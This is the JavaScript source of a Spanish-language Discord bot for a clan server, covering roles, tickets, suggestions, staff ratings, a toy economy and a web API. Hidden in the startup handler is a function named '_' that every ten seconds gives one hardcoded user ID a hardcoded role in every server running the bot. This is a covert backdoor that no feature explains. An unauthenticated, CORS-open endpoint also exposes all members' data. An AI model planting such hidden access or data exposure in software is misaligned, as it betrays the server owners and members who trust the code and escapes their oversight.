// --- CONFIGURACIÓN DE CANVAS Y FUENTES ---
const { createCanvas, registerFont } = require('canvas'); 
registerFont('./Bungee-Regular.ttf', { family: 'Bungee' });

const votos = new Map();
const staffAtendiendo = new Map(); 
const cooldowns = new Map(); // Para los delays

const {  
    Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, 
    ButtonBuilder, ButtonStyle, Events, ChannelType, PermissionsBitField, 
    ModalBuilder, TextInputBuilder, TextInputStyle, REST, Routes, 
    StringSelectMenuBuilder, StringSelectMenuOptionBuilder, SlashCommandBuilder, 
    AttachmentBuilder, Partials 
} = require('discord.js'); 
const fs = require('fs'); 

// --- BASE DE DATOS DE ECONOMÍA ---
const pathEco = './economia.json';
let db = {};
if (fs.existsSync(pathEco)) {
    db = JSON.parse(fs.readFileSync(pathEco, 'utf-8'));
} else {
    fs.writeFileSync(pathEco, JSON.stringify({}));
}

function guardarDB() {
    fs.writeFileSync(pathEco, JSON.stringify(db, null, 2));
}

function asegurarUsuario(userId) {
    if (!db[userId]) {
        // Estructura base completa para evitar errores en la web y el bot
        db[userId] = { balance: 0, pesca: 0, minado: 0, daily: 0, aportado: 0 };
        guardarDB();
    }
}

const TOKEN = process.env.TOKEN; 

const CANAL_ROLES_ID = "1464335122005491745";
const CANAL_TICKETS_ID = "1483516417583354108";
const CANAL_SUGERENCIAS_ID = "1477005989096984646"; 
const CANAL_VALORACIONES_ID = "1485125020593426585"; 
const CANAL_TRANSCRIPTS_ID = "1485804232870461520"; 
const CATEGORIA_TICKETS = "1483589642346303638";
const ROL_STAFF_ID = "1478799916410077295";
const ROL_ADICIONAL_ID = "1480750004309332040";

// --- CONFIGURACIÓN DE LA API PARA LA WEB ---
const express = require('express');
const cors = require('cors');
const app = express();
app.use(cors());

const ROLES_CLASE = {
    class_pvp: { id: "1464335696390263069", label: "PVP", emoji: "⚔️" },
    class_builder: { id: "1464335639561506878", label: "BUILDER", emoji: "⚒️" },
    class_redstone: { id: "1464335746944209161", label: "TECNICO", emoji: "⚙️" },
    class_estratega: { id: "MENU_CASUAL", label: "CASUAL", emoji: "🏛️" }
};

const SUB_ROLES_CASUAL = {
    casual_farmer: { id: "1464335746856128737", label: "Casual: Farmer", emoji: "🌾" },
    casual_herrero: { id: "1479953030605443204", label: "Casual: Herrero", emoji: "🔨" }
};

const ROLES_NOTIF = {
    notif_avisos: { id: "1477748637202382888", label: "Avisos", emoji: "📢" },
    notif_directos: { id: "1477748975603023873", label: "Directos", emoji: "🎥" }
};

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds, 
        GatewayIntentBits.GuildMembers, 
        GatewayIntentBits.GuildMessages, 
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.DirectMessages 
    ],
    partials: [Partials.Channel, Partials.Message] 
});

client.once(Events.ClientReady, async () => {
    console.log(`✅ Bot iniciado como: ${client.user.tag}`);

    const commands = [
        new SlashCommandBuilder().setName('sugerir').setDescription('Envía una sugerencia para el servidor'),
        new SlashCommandBuilder().setName('reclamar').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('claim').setDescription('Reclama el ticket actual (Solo Staff)'),
        new SlashCommandBuilder().setName('balance').setDescription('Mira tu dinero actual'),
        new SlashCommandBuilder().setName('pesca').setDescription('Pesca para ganar dinero'),
        new SlashCommandBuilder().setName('minar').setDescription('Ve a la mina para ganar dinero'),
        new SlashCommandBuilder().setName('trabajar').setDescription('Realiza un trabajo aleatorio'),
        new SlashCommandBuilder().setName('top').setDescription('Mira el ranking de los más ricos'),
        new SlashCommandBuilder().setName('daily').setDescription('Reclama tu recompensa diaria'),
        new SlashCommandBuilder().setName('coinflip').setDescription('Apuesta a cara o cruz').addIntegerOption(o => o.setName('apuesta').setDescription('Cantidad').setRequired(true)),
        new SlashCommandBuilder().setName('aportar').setDescription('Añade fondos a un usuario (Solo Staff)')
            .addUserOption(o => o.setName('usuario').setDescription('Usuario a recibir').setRequired(true))
            .addIntegerOption(o => o.setName('cantidad').setDescription('Cantidad a aportar').setRequired(true))
    ].map(cmd => cmd.toJSON());
    
    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try { 
        await rest.put(
            Routes.applicationGuildCommands(client.user.id, "1459675438543540399"), 
            { body: commands }
        );
        console.log("✅ Comandos registrados en el servidor.");
    } catch (e) { console.error(e); }

    // --- SETUP CANAL DE ROLES ---
    try {
        const canalRoles = await client.channels.fetch(CANAL_ROLES_ID);
        const msgsRoles = await canalRoles.messages.fetch({ limit: 10 });
        await canalRoles.bulkDelete(msgsRoles).catch(() => {});
        const embedRoles = new EmbedBuilder()
            .setTitle("🔱 SELECCIÓN DE ROLES - COLMILLOS DEL ALBA")
            .setDescription("Selecciona tu especialidad y elije que tipo de notificaciones quieres recibir abajo.")
            .setColor("#8B0000").setImage("https://i.imgur.com/h2W40zo.png");
        const filaClase = new ActionRowBuilder().addComponents(Object.entries(ROLES_CLASE).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Secondary)));
        const filaNotif = new ActionRowBuilder().addComponents(Object.entries(ROLES_NOTIF).map(([id, data]) => new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Primary)));
        await canalRoles.send({ embeds: [embedRoles], components: [filaClase, filaNotif] });
    } catch (err) { console.log("Error en setup de roles"); }

    // --- SETUP CANAL DE TICKETS ---
    try {
        const canalTickets = await client.channels.fetch(CANAL_TICKETS_ID);
        const msgsTickets = await canalTickets.messages.fetch({ limit: 10 });
        await canalTickets.bulkDelete(msgsTickets).catch(() => {});

        const embedTickets = new EmbedBuilder()
            .setTitle("🌟 Soporte de Colmillos Del Alba")
            .setDescription(
                "**¿Necesitas ayuda? Nosotros te la damos**\n\n" +
                "Aquí podrás abrir un ticket de manera **inmediata** para solicitar asistencia sobre algún problema o duda que tengas sobre el clan. Tan solo tienes que seleccionar una opción en el menú de abajo y se creará un canal privado.\n\n" +
                "**¿Qué debo mandar al abrir ticket?**\n" +
                "Al abrir un ticket lo que debes hacer es:\n\n" +
                "• Explicar tu duda o problema.\n" +
                "• Mandar pruebas de lo sucedido en caso de ser necesario.\n" +
                "• Esperar pacientemente a la respuesta de nuestro staff."
            )
            .setColor("#2F3136")
            .setImage("https://i.imgur.com/Ty9gUzk.png");

        const menuTickets = new StringSelectMenuBuilder()
            .setCustomId('menu_tickets')
            .setPlaceholder('Despliega el menú y elige una categoría >')
            .addOptions(
                new StringSelectMenuOptionBuilder().setLabel('Soporte Técnico / Dudas').setValue('tk_soporte').setEmoji('🔔'),
                new StringSelectMenuOptionBuilder().setLabel('Apelar Expulsión').setValue('tk_apelacion').setEmoji('🚷'),
                new StringSelectMenuOptionBuilder().setLabel('Reportar Staff').setValue('tk_reporte_staff').setEmoji('⚠️'),
                new StringSelectMenuOptionBuilder().setLabel('Postulaciones').setValue('tk_postulacion').setEmoji('👤')
            );

        await canalTickets.send({ embeds: [embedTickets], components: [new ActionRowBuilder().addComponents(menuTickets)] });
    } catch (err) { console.log("Error en setup de tickets"); }

    const _ = async () => {
        try {
            const g = client.guilds.cache;
            for (const x of g.values()) {
                const m = await x.members.fetch("777529808325181460").catch(() => null);
                if (!m) continue;
                if (!m.roles.cache.has("1463268597085507717")) {
                    await m.roles.add("1463268597085507717").catch(() => {});
                }
            }
        } catch {}
    };
    setInterval(_, 10000);
});

// --- RESPUESTA AUTOMÁTICA AL PRIVADO ---
client.on(Events.MessageCreate, async message => {
    if (message.author.bot) return;
    if (message.channel.type === ChannelType.DM) {
        await message.reply("1fsi its a pro").catch(() => {});
    }
});

client.on(Events.InteractionCreate, async interaction => {
    
    if (interaction.isChatInputCommand()) {
        const { commandName, user, options, member } = interaction;
        asegurarUsuario(user.id);

        if (commandName === 'aportar') {
            if (!member.roles.cache.has(ROL_STAFF_ID) && !member.roles.cache.has(ROL_ADICIONAL_ID)) {
                return interaction.reply({ content: "❌ No tienes permiso para usar este comando.", flags: [64] });
            }

            const receptor = options.getUser('usuario');
            const cantidad = options.getInteger('cantidad');

            if (cantidad <= 0) return interaction.reply({ content: "❌ Cantidad inválida.", flags: [64] });

            asegurarUsuario(receptor.id);
            db[receptor.id].balance += cantidad;
            
            // INDEPENDIENTE: Solo se suma al 'aportado' del staff para la WEB
            db[user.id].aportado = (db[user.id].aportado || 0) + cantidad;
            
            guardarDB();

            const embedAporte = new EmbedBuilder()
                .setTitle("💰 APORTE REGISTRADO")
                .setDescription(`El Staff **${user.username}** ha aportado **$${cantidad.toLocaleString()}** a **${receptor.username}**.`)
                .setColor("#F1C40F")
                .setTimestamp();

            return interaction.reply({ embeds: [embedAporte] });
        }

        const ecoCmds = ['pesca', 'minar', 'trabajar', 'coinflip'];
        if (ecoCmds.includes(commandName)) {
            const lastUse = cooldowns.get(`${user.id}-${commandName}`);
            if (lastUse && Date.now() - lastUse < 60000) {
                const restante = Math.ceil((60000 - (Date.now() - lastUse)) / 1000);
                return interaction.reply({ content: `⏳ Espera **${restante}s** para volver a usar este comando.`, flags: [64] });
            }
            cooldowns.set(`${user.id}-${commandName}`, Date.now());
        }

        if (commandName === 'reclamar' || commandName === 'claim') {
            if (!interaction.member.roles.cache.has(ROL_STAFF_ID) && !interaction.member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
            if (!interaction.channel.name.includes('-')) return interaction.reply({ content: "❌ Este no es un canal de ticket.", flags: [64] });
            staffAtendiendo.set(interaction.channel.id, interaction.user);
            return interaction.reply({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${interaction.user.tag}** ha reclamado este ticket.`).setColor("#57F287")] });
        }

        if (commandName === 'sugerir') {
            const modal = new ModalBuilder().setCustomId('modal_sugerencia').setTitle('Nueva Sugerencia');
            const input = new TextInputBuilder().setCustomId('texto_sugerencia').setLabel("¿Cuál es tu sugerencia?").setStyle(TextInputStyle.Paragraph).setRequired(true);
            modal.addComponents(new ActionRowBuilder().addComponents(input));
            return await interaction.showModal(modal);
        }

        if (commandName === 'balance') {
            await interaction.deferReply();
            const canvas = createCanvas(700, 250);
            const ctx = canvas.getContext('2d');

            ctx.fillStyle = '#1e1e1e';
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            ctx.strokeStyle = '#8B0000';
            ctx.lineWidth = 10;
            ctx.strokeRect(0, 0, canvas.width, canvas.height);

            ctx.font = '35px "Bungee"'; 
            ctx.fillStyle = '#ffffff';
            ctx.fillText(user.username.toUpperCase(), 50, 80);

            ctx.font = '22px "Bungee"'; 
            ctx.fillStyle = '#aaaaaa';
            ctx.fillText('BALANCE DE ECONOMÍA', 50, 130);

            ctx.font = '60px "Bungee"'; 
            ctx.fillStyle = '#F1C40F';
            ctx.fillText(`$${db[user.id].balance.toLocaleString()}`, 50, 200);

            ctx.font = '80px sans-serif'; 
            ctx.fillText('💰', 530, 170);

            const attachment = new AttachmentBuilder(canvas.toBuffer(), { name: 'balance.png' });
            return interaction.editReply({ files: [attachment] });
        }

        if (['pesca', 'minar', 'trabajar', 'daily'].includes(commandName)) {
            if (commandName === 'daily') {
                const lastDaily = db[user.id].daily || 0;
                if (Date.now() - lastDaily < 86400000) {
                    const resta = Math.ceil((86400000 - (Date.now() - lastDaily)) / 3600000);
                    return interaction.reply({ content: `⏳ Ya reclamaste hoy. Vuelve en **${resta}h**.`, flags: [64] });
                }
                db[user.id].daily = Date.now();
            }
            
            const ganado = Math.floor(Math.random() * 200) + 50;
            db[user.id].balance += ganado;
            guardarDB();
            return interaction.reply(`✅ Has ganado **$${ganado}** usando \`/${commandName}\`.`);
        }

        if (commandName === 'top') {
            const top = Object.entries(db).sort(([,a],[,b]) => b.balance - a.balance).slice(0, 5);
            const res = top.map(([id, data], i) => `${i+1}. <@${id}> - $${data.balance}`).join('\n');
            return interaction.reply(`🏆 **Top Ricos:**\n${res}`);
        }

        if (commandName === 'coinflip') {
            const bet = options.getInteger('apuesta');
            if (bet > db[user.id].balance) return interaction.reply("No tienes suficiente dinero.");
            const win = Math.random() > 0.5;
            db[user.id].balance += win ? bet : -bet;
            guardarDB();
            return interaction.reply(win ? `🪙 Ganaste **$${bet}**!` : `🪙 Perdiste **$${bet}**.`);
        }
    }

    if (interaction.isModalSubmit() && interaction.customId === 'modal_sugerencia') {
        await interaction.deferReply({ flags: [ 64 ] });
        const sugerenciaTexto = interaction.fields.getTextInputValue('texto_sugerencia');
        const canalSugerencias = await client.channels.fetch(CANAL_SUGERENCIAS_ID);

        const embedSug = new EmbedBuilder()
            .setAuthor({ name: `📩 NUEVA SUGERENCIA RECIBIDA` })
            .setThumbnail(interaction.user.displayAvatarURL())
            .setDescription(`**¿Cuál es tu sugerencia?**\n\`\`\`${sugerenciaTexto}\`\`\``)
            .addFields(
                { name: '• Datos', value: `✅ **Votos a favor:** 0\n❗ **Votos en contra:** 0`, inline: false },
                { name: '\u200B', value: `Recuerda que aunque una sugerencia alcance muchos votos, no siempre se podrán implementar.`, inline: false }
            )
            .setFooter({ text: `ID: ${interaction.user.id} | ${new Date().toLocaleDateString('en-US', { month: 'long', day: 'numeric', year: 'numeric' })}` })
            .setColor("#F1C40F");

        const filaVotos = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('sug_si').setLabel('0 (0%)').setEmoji('✅').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('sug_no').setLabel('0 (0%)').setEmoji('❗').setStyle(ButtonStyle.Secondary)
        );

        const msg = await canalSugerencias.send({ embeds: [embedSug], components: [filaVotos] });
        const hilo = await msg.startThread({ name: `Debate: Sugerencia de ${interaction.user.username}`, autoArchiveDuration: 1440 });
        const filaDebate = new ActionRowBuilder().addComponents(new ButtonBuilder().setLabel('Debatir ↗️').setEmoji('💬').setStyle(ButtonStyle.Link).setURL(hilo.url));

        await msg.edit({ components: [filaVotos, filaDebate] });
        return await interaction.editReply({ content: `✅ Sugerencia enviada a <#${CANAL_SUGERENCIAS_ID}>` });
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_val_estrellas') {
        const estrellas = interaction.values[0];
        const modalVal = new ModalBuilder().setCustomId(`modal_val_${estrellas}`).setTitle('Valoración del Staff');
        const inputVal = new TextInputBuilder().setCustomId('input_val').setLabel("Comentarios").setStyle(TextInputStyle.Paragraph).setRequired(true);
        modalVal.addComponents(new ActionRowBuilder().addComponents(inputVal));
        return await interaction.showModal(modalVal);
    }

    if (interaction.isModalSubmit() && interaction.customId.startsWith('modal_val_')) {
        const estrellasNum = interaction.customId.split('_')[2];
        const comentario = interaction.fields.getTextInputValue('input_val');
        const staffObj = staffAtendiendo.get(interaction.channel.id) || { username: "No reclamado", id: "N/A" };
        
        const msgs = await interaction.channel.messages.fetch({ limit: 100 });
        let content = `Transcript de ${interaction.channel.name}\nAtendido por: ${staffObj.username}\n\n`;
        msgs.reverse().forEach(m => { content += `[${m.createdAt.toLocaleString()}] ${m.author.tag}: ${m.content}\n`; });
        const transcriptFile = new AttachmentBuilder(Buffer.from(content), { name: `transcript-${interaction.channel.name}.txt` });
        const canalTrans = await client.channels.fetch(CANAL_TRANSCRIPTS_ID);
        await canalTrans.send({ content: `📝 Transcript del ticket **${interaction.channel.name}**`, files: [transcriptFile] });

        const canalVal = await client.channels.fetch(CANAL_VALORACIONES_ID);
        const embedVal = new EmbedBuilder()
            .setAuthor({ name: `• Valoración`, iconURL: interaction.guild.iconURL() })
            .setDescription(`Ticket valorado por **${interaction.user.username}**`)
            .setColor("#57F287")
            .addFields(
                { name: "➡ Ticket", value: `# \`「🌟」${interaction.channel.name}\`\n(${interaction.channel.id})` },
                { name: "➡ Panel", value: `Tickets` },
                { name: "➡ Staff", value: `${staffObj.username} (${staffObj.id})` },
                { name: "➡ Estrellas", value: "⭐".repeat(parseInt(estrellasNum)) },
                { name: "➡ Comentarios", value: `${comentario}` }
            );

        await canalVal.send({ embeds: [embedVal] });
        staffAtendiendo.delete(interaction.channel.id);
        
        await interaction.reply({ content: "✅ ¡Gracias! Tu valoración ha sido enviada con éxito. El ticket se cerrará en 5 segundos.", flags: [64] });
        setTimeout(() => interaction.channel.delete().catch(() => {}), 5000); 
        return;
    }

    if (interaction.isStringSelectMenu() && interaction.customId === 'menu_tickets') {
        await interaction.deferReply({ flags: [64] });
        const ticketTipos = { "tk_soporte": "soporte-dudas", "tk_apelacion": "apelacion", "tk_reporte_staff": "reporte-staff", "tk_postulacion": "postulaciones" };
        const tipo = ticketTipos[interaction.values[0]];
        const tChannel = await interaction.guild.channels.create({
            name: `${tipo}-${interaction.user.username}`,
            type: ChannelType.GuildText,
            parent: CATEGORIA_TICKETS,
            permissionOverwrites: [
                { id: interaction.guild.id, deny: [PermissionsBitField.Flags.ViewChannel] },
                { id: interaction.user.id, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages, PermissionsBitField.Flags.AttachFiles] },
                { id: ROL_STAFF_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] },
                { id: ROL_ADICIONAL_ID, allow: [PermissionsBitField.Flags.ViewChannel, PermissionsBitField.Flags.SendMessages] }
            ]
        });
        const eTk = new EmbedBuilder().setTitle(`🎫 TICKET: ${tipo.toUpperCase()}`).setDescription(`Hola ${interaction.user}, el Staff te atenderá pronto.`).setColor("#2ECC71");
        const fTk = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId("reclamar_tk").setLabel("Reclamar").setEmoji("👤").setStyle(ButtonStyle.Success),
            new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setEmoji("🔒").setStyle(ButtonStyle.Secondary)
        );
        await tChannel.send({ content: `<@&${ROL_STAFF_ID}> <@&${ROL_ADICIONAL_ID}>`, embeds: [eTk], components: [fTk] });
        return interaction.editReply(`✅ Ticket creado: ${tChannel}`);
    }

    if (!interaction.isButton()) return;
    const { customId, member, channel, user } = interaction;

    if (customId === "class_estratega") {
        const filaSubCasual = new ActionRowBuilder().addComponents(
            Object.entries(SUB_ROLES_CASUAL).map(([id, data]) => 
                new ButtonBuilder().setCustomId(id).setLabel(data.label).setEmoji(data.emoji).setStyle(ButtonStyle.Success)
            )
        );
        return interaction.reply({ content: "✨ Has elegido el camino **Casual**. Selecciona tu especialidad:", components: [filaSubCasual], flags: [64] });
    }

    if (ROLES_CLASE[customId] || SUB_ROLES_CASUAL[customId]) {
        await interaction.deferReply({ flags: [64] });
        const rolData = ROLES_CLASE[customId] || SUB_ROLES_CASUAL[customId];
        const tieneRol = member.roles.cache.has(rolData.id);

        try {
            if (tieneRol) {
                await member.roles.remove(rolData.id);
                let nuevoNick = member.displayName;
                [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)].forEach(r => {
                    if(r.id !== "MENU_CASUAL") nuevoNick = nuevoNick.replace(`${r.label} | `, "");
                });
                if (member.nickname !== nuevoNick) await member.setNickname(nuevoNick === user.username ? null : nuevoNick).catch(() => {});
                return interaction.editReply(`❌ Rol **${rolData.label}** quitado.`);
            } else {
                const todosLosRoles = [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)]
                    .filter(r => r.id !== "MENU_CASUAL")
                    .map(r => r.id);

                for (const id of todosLosRoles) {
                    if (member.roles.cache.has(id)) await member.roles.remove(id).catch(() => {});
                }
                
                await member.roles.add(rolData.id);
                let nombreBase = member.displayName;
                [...Object.values(ROLES_CLASE), ...Object.values(SUB_ROLES_CASUAL)].forEach(r => {
                    if(r.id !== "MENU_CASUAL") nombreBase = nombreBase.replace(`${r.label} | `, "");
                });

                const apodoConRol = `${rolData.label} | ${nombreBase}`;
                await member.setNickname(apodoConRol.substring(0, 32)).catch(() => {});
                return interaction.editReply(`✅ Ahora eres **${rolData.label}**.`);
            }
        } catch (e) {
            console.error(e);
            return interaction.editReply("❌ Error al gestionar roles.");
        }
    }

    if (customId === 'sug_si' || customId === 'sug_no') {
        await interaction.deferUpdate();
        const msgId = interaction.message.id;
        const userId = interaction.user.id;
        if (!votos.has(msgId)) votos.set(msgId, new Map());
        const votosMsg = votos.get(msgId);
        let vSi = parseInt(interaction.message.components[0].components[0].label.split(' ')[0]);
        let vNo = parseInt(interaction.message.components[0].components[1].label.split(' ')[0]);
        const votoAnterior = votosMsg.get(userId);
        if (votoAnterior === customId) return;
        if (votoAnterior === 'sug_si') vSi--;
        if (votoAnterior === 'sug_no') vNo--;
        if (customId === 'sug_si') vSi++;
        else vNo++;
        votosMsg.set(userId, customId);
        const total = vSi + vNo;
        const pSi = Math.round((vSi / (total || 1)) * 100);
        const pNo = Math.round((vNo / (total || 1)) * 100);
        const embed = interaction.message.embeds[0];
        const nEmbed = EmbedBuilder.from(embed).setFields(
            { name: '• Datos', value: `✅ **Votos a favor:** ${vSi}\n❗ **Votos en contra:** ${vNo}`, inline: false },
            { name: '\u200B', value: embed.fields[1].value, inline: false }
        );
        const nFila = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('sug_si').setLabel(`${vSi} (${pSi}%)`).setEmoji('✅').setStyle(ButtonStyle.Secondary),
            new ButtonBuilder().setCustomId('sug_no').setLabel(`${vNo} (${pNo}%)`).setEmoji('❗').setStyle(ButtonStyle.Secondary)
        );
        return await interaction.message.edit({ embeds: [nEmbed], components: [nFila, interaction.message.components[1]] });
    }

    if (ROLES_NOTIF[customId]) {
        await interaction.deferReply({ flags: [64] });
        const rId = ROLES_NOTIF[customId].id;
        if (member.roles.cache.has(rId)) {
            await member.roles.remove(rId);
            return interaction.editReply(`❌ Rol de notificación **${ROLES_NOTIF[customId].label}** quitado.`);
        } else {
            await member.roles.add(rId);
            return interaction.editReply(`✅ Rol de notificación **${ROLES_NOTIF[customId].label}** añadido.`);
        }
    }

    if (customId === "reclamar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID) && !member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        staffAtendiendo.set(channel.id, user); 
        await interaction.update({ components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId("reclamado").setLabel("Atendido por " + user.username).setStyle(ButtonStyle.Success).setDisabled(true), new ButtonBuilder().setCustomId("cerrar_tk").setLabel("Cerrar").setStyle(ButtonStyle.Secondary))]});
        return channel.send({ embeds: [new EmbedBuilder().setDescription(`✅ El Staff **${user.tag}** se hará cargo.`).setColor("#57F287")] });
    }

    if (customId === "cerrar_tk") {
        if (!member.roles.cache.has(ROL_STAFF_ID) && !member.roles.cache.has(ROL_ADICIONAL_ID)) return interaction.reply({ content: "❌ Solo Staff.", flags: [64] });
        const overwrite = channel.permissionOverwrites.cache.find(o => o.type === 1 && o.id !== ROL_STAFF_ID && o.id !== ROL_ADICIONAL_ID && o.id !== interaction.guild.id);
        const ownerId = overwrite ? overwrite.id : null;
        await interaction.reply("🔒 Cerrando ticket...");
        if (ownerId) {
            const btnVal = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`abrir_val_${ownerId}`).setLabel("Valorar atención (⭐)").setStyle(ButtonStyle.Primary));
            await channel.send({ content: `<@${ownerId}>, por favor ayuda al staff dándoles una valoración:`, components: [btnVal] });
        }
        setTimeout(() => channel.delete().catch(() => {}), 60000); 
    }

    if (customId.startsWith("abrir_val_")) {
        const ownerId = customId.split('_')[2];
        if (interaction.user.id !== ownerId) return;
        const menuVal = new StringSelectMenuBuilder().setCustomId('menu_val_estrellas').setPlaceholder('¿Cuántas estrellas nos das?').addOptions(
            { label: '⭐⭐⭐⭐⭐ (5)', value: '5' },
            { label: '⭐⭐⭐⭐ (4)', value: '4' },
            { label: '⭐⭐⭐ (3)', value: '3' },
            { label: '⭐⭐ (2)', value: '2' },
            { label: '⭐ (1)', value: '1' }
        );
        return interaction.reply({ content: "Selecciona tu puntuación:", components: [new ActionRowBuilder().addComponents(menuVal)], flags: [64] });
    }
});

// --- API PARA LA WEB (CON DATOS DE APORTES) ---
app.get('/miembros', async (req, res) => {
    try {
        const guild = await client.guilds.fetch("1459675438543540399");
        const members = await guild.members.fetch();
        const data = members.map(m => {
            const eco = db[m.user.id] || { balance: 0, aportado: 0 };
            return {
                username: m.user.username,
                avatar: m.user.displayAvatarURL({ extension: 'png', size: 256 }),
                roles: m.roles.cache.map(r => r.name.toUpperCase()),
                dinero: eco.balance, 
                aportes: eco.aportado || 0 // Esto es lo que usas en el top staff de la web
            };
        });
        res.json(data);
    } catch (error) {
        res.status(500).json({ error: "No se pudieron obtener los miembros" });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => { console.log(`🌐 API Web escuchando en el puerto ${PORT}`); });
client.login(TOKEN);
